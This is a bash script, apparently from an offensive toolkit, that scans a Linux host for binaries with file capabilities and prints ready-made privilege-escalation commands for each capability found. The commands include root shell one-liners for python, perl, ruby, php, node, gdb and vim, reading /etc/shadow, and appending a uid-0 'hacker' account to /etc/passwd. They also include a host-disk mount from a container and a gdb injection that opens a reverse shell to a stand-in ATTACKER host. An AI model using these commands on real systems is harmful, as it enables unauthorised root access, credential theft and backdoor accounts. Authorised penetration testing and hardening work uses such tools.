#!/bin/bash
# Linux Capabilities Privilege Escalation
# Usage: ./capabilities_privesc.sh

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}=== Linux Capabilities Privilege Escalation ===${NC}\n"

echo -e "${YELLOW}[*] Scanning for binaries with capabilities...${NC}\n"
CAPS=$(getcap -r / 2>/dev/null)

if [ -z "$CAPS" ]; then
    echo -e "${YELLOW}[*] No capabilities found (or getcap not available).${NC}"
    exit 0
fi

echo "$CAPS"
echo ""

# ── CAP_SETUID ──
echo -e "${GREEN}--- CAP_SETUID (set UID to 0 = root) ---${NC}"
SETUID_BINS=$(echo "$CAPS" | grep -i 'cap_setuid')
if [ -n "$SETUID_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$SETUID_BINS"
    echo ""

    if echo "$SETUID_BINS" | grep -q "python"; then
        PYBIN=$(echo "$SETUID_BINS" | grep "python" | awk '{print $1}')
        echo -e "${YELLOW}Exploit (python):${NC}"
        echo "  $PYBIN -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
    fi
    if echo "$SETUID_BINS" | grep -q "perl"; then
        PLBIN=$(echo "$SETUID_BINS" | grep "perl" | awk '{print $1}')
        echo -e "${YELLOW}Exploit (perl):${NC}"
        echo "  $PLBIN -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
    fi
    if echo "$SETUID_BINS" | grep -q "ruby"; then
        echo -e "${YELLOW}Exploit (ruby):${NC}"
        echo "  ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
    fi
    if echo "$SETUID_BINS" | grep -q "php"; then
        echo -e "${YELLOW}Exploit (php):${NC}"
        echo "  php -r 'posix_setuid(0); system(\"/bin/bash\");'"
    fi
    if echo "$SETUID_BINS" | grep -q "node"; then
        echo -e "${YELLOW}Exploit (node):${NC}"
        echo "  node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"
    fi
    if echo "$SETUID_BINS" | grep -q "gdb"; then
        echo -e "${YELLOW}Exploit (gdb):${NC}"
        echo "  gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit"
    fi
    if echo "$SETUID_BINS" | grep -q "vim\|vi$"; then
        echo -e "${YELLOW}Exploit (vim):${NC}"
        echo "  vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\")'"
    fi
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_DAC_OVERRIDE ──
echo -e "${GREEN}--- CAP_DAC_OVERRIDE (bypass file read/write permissions) ---${NC}"
DAC_BINS=$(echo "$CAPS" | grep -i 'cap_dac_override')
if [ -n "$DAC_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$DAC_BINS"
    echo -e "${YELLOW}Exploit: Read/write ANY file (e.g., /etc/shadow, /etc/passwd)${NC}"
    if echo "$DAC_BINS" | grep -q "python"; then
        echo "  python3 -c 'print(open(\"/etc/shadow\").read())'"
        echo "  python3 -c 'open(\"/etc/passwd\",\"a\").write(\"hacker:\\$1\\$x\\$hash:0:0::/root:/bin/bash\\n\")'"
    fi
    if echo "$DAC_BINS" | grep -q "vim\|vi$"; then
        echo "  vim /etc/shadow"
    fi
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_DAC_READ_SEARCH ──
echo -e "${GREEN}--- CAP_DAC_READ_SEARCH (bypass file read permissions) ---${NC}"
DACR_BINS=$(echo "$CAPS" | grep -i 'cap_dac_read_search')
if [ -n "$DACR_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$DACR_BINS"
    echo -e "${YELLOW}Exploit: Read ANY file (e.g., /etc/shadow, SSH keys)${NC}"
    if echo "$DACR_BINS" | grep -q "tar"; then
        echo "  tar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz -C /tmp/"
    fi
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_SYS_ADMIN ──
echo -e "${GREEN}--- CAP_SYS_ADMIN (mount, ptrace, bpf, etc.) ---${NC}"
ADMIN_BINS=$(echo "$CAPS" | grep -i 'cap_sys_admin')
if [ -n "$ADMIN_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$ADMIN_BINS"
    echo -e "${YELLOW}Exploit: Mount host filesystem, modify /etc/passwd, etc.${NC}"
    echo "  # In container with CAP_SYS_ADMIN:"
    echo "  mkdir /tmp/hostmnt"
    echo "  mount /dev/sda1 /tmp/hostmnt"
    echo "  echo 'hacker:\$1\$x\$hash:0:0::/root:/bin/bash' >> /tmp/hostmnt/etc/passwd"
    echo "  # Or cgroup escape (see container-escape module)"
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_SYS_PTRACE ──
echo -e "${GREEN}--- CAP_SYS_PTRACE (process tracing / injection) ---${NC}"
PTRACE_BINS=$(echo "$CAPS" | grep -i 'cap_sys_ptrace')
if [ -n "$PTRACE_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$PTRACE_BINS"
    echo -e "${YELLOW}Exploit: Attach to root process, inject shellcode${NC}"
    echo "  # Find root process:"
    echo "  ps aux | grep '^root'"
    echo "  # Inject with gdb:"
    echo "  gdb -p <ROOT_PID> -ex 'call system(\"bash -c bash>/dev/tcp/ATTACKER/4444 0>&1&\")' -ex detach -ex quit"
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_NET_RAW ──
echo -e "${GREEN}--- CAP_NET_RAW (raw sockets — sniffing, ARP spoof) ---${NC}"
NETRAW_BINS=$(echo "$CAPS" | grep -i 'cap_net_raw')
if [ -n "$NETRAW_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$NETRAW_BINS"
    echo -e "${YELLOW}Exploit: Packet sniffing, ARP spoofing from unprivileged user${NC}"
    if echo "$NETRAW_BINS" | grep -q "tcpdump"; then
        echo "  tcpdump -i eth0 -w /tmp/capture.pcap"
    fi
    if echo "$NETRAW_BINS" | grep -q "python"; then
        echo "  python3 -c 'import socket; s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW); ...'"
    fi
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_CHOWN / CAP_FOWNER ──
echo -e "${GREEN}--- CAP_CHOWN / CAP_FOWNER (change file ownership) ---${NC}"
CHOWN_BINS=$(echo "$CAPS" | grep -iE 'cap_chown|cap_fowner')
if [ -n "$CHOWN_BINS" ]; then
    echo -e "${RED}[!] Found:${NC}"
    echo "$CHOWN_BINS"
    echo -e "${YELLOW}Exploit: Take ownership of /etc/shadow, /etc/passwd, SSH keys${NC}"
    if echo "$CHOWN_BINS" | grep -q "python"; then
        echo "  python3 -c 'import os; os.chown(\"/etc/shadow\", 1000, 1000)'"
        echo "  cat /etc/shadow"
    fi
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

# ── CAP_NET_BIND_SERVICE ──
echo -e "${GREEN}--- CAP_NET_BIND_SERVICE (bind to ports < 1024) ---${NC}"
BIND_BINS=$(echo "$CAPS" | grep -i 'cap_net_bind_service')
if [ -n "$BIND_BINS" ]; then
    echo -e "${YELLOW}[*] Found (lower severity):${NC}"
    echo "$BIND_BINS"
    echo -e "${YELLOW}Can bind to privileged ports — useful for phishing/MitM${NC}"
    echo ""
else
    echo -e "${YELLOW}[*] None found.${NC}\n"
fi

echo -e "${GREEN}=== Scan Complete ===${NC}"
